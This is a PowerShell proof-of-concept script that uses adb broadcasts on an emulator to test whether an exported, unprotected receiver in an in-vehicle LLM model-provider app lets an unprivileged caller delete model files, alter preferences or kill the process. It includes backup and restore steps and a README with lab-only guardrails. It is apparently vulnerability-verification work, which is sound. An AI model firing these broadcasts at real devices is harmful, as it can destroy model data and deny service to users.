param(
    [string]$OutputDir = "data/_local/poc_evidence/e2e-lmp1-lmp2",
    [switch]$Execute,
    [switch]$SendPromptComplete,
    [switch]$ProbeServiceSuppression,
    [int]$WaitSeconds = 3
)

$ErrorActionPreference = "Stop"

$RepoRoot = Split-Path -Parent $PSScriptRoot
$RunStamp = Get-Date -Format "yyyyMMdd_HHmmss"
$RunDir = Join-Path (Join-Path $RepoRoot $OutputDir) $RunStamp
New-Item -ItemType Directory -Force -Path $RunDir | Out-Null

$Pkg = "ai.pleos.llm.model.provider"
$Receiver = "ai.pleos.llm.model.provider/ai.pleos.llm.model.provider.receiver.LLMModelProviderReceiver"
$ShareCompleteAction = "ai.pleos.llm.model.provider.intent.action.SHARE_FILE_COMPLETE"
$PromptCompleteAction = "ai.pleos.llm.model.provider.intent.action.PROMPTS_QUERY_COMPLETE"
$CaasStartedAction = "ai.pleos.caas.intent.action.LLM_SERVICE_STARTED"
$CurrentUser = ""
$DataDir = ""
$FilesDir = ""
$PrefsDir = ""
$PrefsFile = "$PrefsDir/LLMModel_Preference.xml"
$RemoteBackup = "/data/local/tmp/codex_lmp2_backup_$RunStamp"

function Save-Lines([string]$Path, [string[]]$Lines) {
    $parent = Split-Path -Parent $Path
    if ($parent) { New-Item -ItemType Directory -Force -Path $parent | Out-Null }
    $Lines | Set-Content -Encoding UTF8 $Path
}

function Invoke-Adb([string[]]$AdbArgs) {
    $oldPreference = $ErrorActionPreference
    $ErrorActionPreference = "Continue"
    try {
        $output = & adb @AdbArgs 2>&1 | Out-String
        return $output.Trim()
    } finally {
        $ErrorActionPreference = $oldPreference
    }
}

function Wait-Boot {
    $deadline = (Get-Date).AddSeconds(180)
    do {
        $state = ""
        try { $state = (Invoke-Adb @("get-state")).Trim() } catch { $state = "" }
        if ($state -eq "device") {
            $boot = (Invoke-Adb @("shell", "getprop", "sys.boot_completed")).Trim()
            if ($boot -eq "1") { return }
        }
        Start-Sleep -Seconds 2
    } while ((Get-Date) -lt $deadline)
    throw "No booted adb device found. Start the PleOS emulator first."
}

function Shell([string]$Command) {
    return Invoke-Adb @("shell", $Command)
}

function Capture-State([string]$Name) {
    $prefix = Join-Path $RunDir $Name
    Save-Lines "$prefix`_pid.txt" @((Shell "pidof $Pkg || true"))
    Save-Lines "$prefix`_files_ls.txt" @((Shell "ls -al $FilesDir 2>&1 || true"))
    Save-Lines "$prefix`_gguf_hashes.txt" @((Shell "for f in $FilesDir/*.gguf; do [ -f `"`$f`" ] && sha256sum `"`$f`"; done 2>&1 || true"))
    Save-Lines "$prefix`_gguf_stats.txt" @((Shell "for f in $FilesDir/*.gguf; do [ -f `"`$f`" ] && stat -c '%n %s %u:%g %a' `"`$f`"; done 2>&1 || true"))
    Save-Lines "$prefix`_prefs.txt" @((Shell "cat $PrefsFile 2>&1 || true"))
}

function Write-Readme([string]$Status) {
    Save-Lines (Join-Path $RunDir "README.md") @(
        "# lmp-1 + lmp-2 E2E Compromise Check",
        "",
        "- status: $Status",
        "- android_user: $CurrentUser",
        "- package: $Pkg",
        "- data_dir: $DataDir",
        "- receiver: $Receiver",
        "- primary trigger: $ShareCompleteAction",
        "- secondary trigger attempted: $SendPromptComplete",
        "- service suppression probe attempted: $ProbeServiceSuppression",
        "- execute mode: $Execute",
        "",
        "## Intended chain",
        "",
        "1. `lmp-1`: same-device unprivileged caller can read the exported LLM prompt/corpus provider.",
        "2. `lmp-2`: the same attacker position sends an explicit broadcast to the exported model-provider receiver.",
        "3. The PoC observes whether the model file or model-provider state changes.",
        "",
        "## Success criteria",
        "",
        "- E2E availability compromise confirmed only if a pre/post diff shows model file deletion, preference mutation, provider failure, or process availability change caused by the broadcast.",
        "- If the broadcast is delivered but no model/state effect is observed, downgrade to receiver reachability only.",
        "- Process-kill is claimed only if the PID actually changes/disappears after the trigger.",
        "",
        "## Guardrails",
        "",
        "- Emulator/lab only.",
        "- No production backend, token, or live API abuse.",
        "- Model files and preferences are backed up before destructive execution and restored in `finally`.",
        "- This is not a vehicle takeover, vehicle actuation, or remote compromise PoC.",
        "",
        "## Key files",
        "",
        "- `pre_*`: before trigger state.",
        "- `post_*`: after trigger state.",
        "- `restore_*`: restoration evidence.",
        "- `broadcast_*.txt`: trigger command output.",
        "- `logcat_lmp2.txt`: filtered LLMModel logs."
    )
}

Push-Location $RepoRoot
try {
    Wait-Boot
    $CurrentUser = (Shell "am get-current-user").Trim()
    if (-not $CurrentUser) { $CurrentUser = "0" }
    $DataDir = "/data/user/$CurrentUser/$Pkg"
    $FilesDir = "$DataDir/files"
    $PrefsDir = "$DataDir/shared_prefs"
    $PrefsFile = "$PrefsDir/LLMModel_Preference.xml"

    Save-Lines (Join-Path $RunDir "adb_devices.txt") @((Invoke-Adb @("devices")))
    Save-Lines (Join-Path $RunDir "adb_root.txt") @((Invoke-Adb @("root")))
    Start-Sleep -Seconds 1

    Save-Lines (Join-Path $RunDir "package_path.txt") @((Shell "pm path $Pkg 2>&1 || true"))
    Save-Lines (Join-Path $RunDir "receiver_manifest_static.txt") @(
        "receiver=$Receiver",
        "exported=true in decompiled AndroidManifest.xml",
        "receiver_permission=<none>",
        "actions=$ShareCompleteAction"
    )

    Capture-State "pre"

    Save-Lines (Join-Path $RunDir "backup_create.txt") @((Shell "rm -rf $RemoteBackup; mkdir -p $RemoteBackup; [ -d $FilesDir ] && cp -a $FilesDir $RemoteBackup/files; [ -d $PrefsDir ] && cp -a $PrefsDir $RemoteBackup/shared_prefs; ls -al $RemoteBackup 2>&1 || true"))

    if (-not $Execute) {
        Write-Readme "preflight_only"
        Write-Host "RUN_DIR=$RunDir"
        Write-Host "STATUS=preflight_only"
        Write-Host "NOTE=No broadcast sent. Re-run with -Execute after confirming emulator snapshot/backup."
        return
    }

    Invoke-Adb @("logcat", "-c") | Out-Null

    $shareOut = Invoke-Adb @("shell", "am", "broadcast", "-n", $Receiver, "-a", $ShareCompleteAction)
    Save-Lines (Join-Path $RunDir "broadcast_share_complete.txt") @($shareOut)
    Start-Sleep -Seconds $WaitSeconds

    if ($SendPromptComplete) {
        $promptOut = Invoke-Adb @("shell", "am", "broadcast", "-n", $Receiver, "-a", $PromptCompleteAction)
        Save-Lines (Join-Path $RunDir "broadcast_prompts_complete.txt") @($promptOut)
        Start-Sleep -Seconds $WaitSeconds
    }

    if ($ProbeServiceSuppression) {
        $caasOut = Invoke-Adb @("shell", "am", "broadcast", "-n", $Receiver, "-a", $CaasStartedAction)
        Save-Lines (Join-Path $RunDir "broadcast_caas_started_after_tamper.txt") @($caasOut)
        Start-Sleep -Seconds $WaitSeconds
    }

    $logcat = Invoke-Adb @("logcat", "-d", "-t", "800")
    Save-Lines (Join-Path $RunDir "logcat_lmp2.txt") (($logcat -split "`r?`n") | Select-String -Pattern "LLMModel|LLMModelProviderReceiver|deleteLLMModelFile|stopAndKillProcess|Both events|already shared complete|startService|shareFileUri" | ForEach-Object { $_.Line })

    Capture-State "post"
    Write-Readme "executed_restore_pending"
} finally {
    if ($Execute) {
        Save-Lines (Join-Path $RunDir "restore.txt") @((Shell "if [ -d $RemoteBackup/files ]; then rm -rf $FilesDir; cp -a $RemoteBackup/files $FilesDir; fi; if [ -d $RemoteBackup/shared_prefs ]; then rm -rf $PrefsDir; cp -a $RemoteBackup/shared_prefs $PrefsDir; fi; ls -al $FilesDir 2>&1 || true"))
        Capture-State "restore"
        Write-Readme "executed_restored"
    }
    Pop-Location
}

Write-Host "RUN_DIR=$RunDir"
Write-Host "STATUS=done"
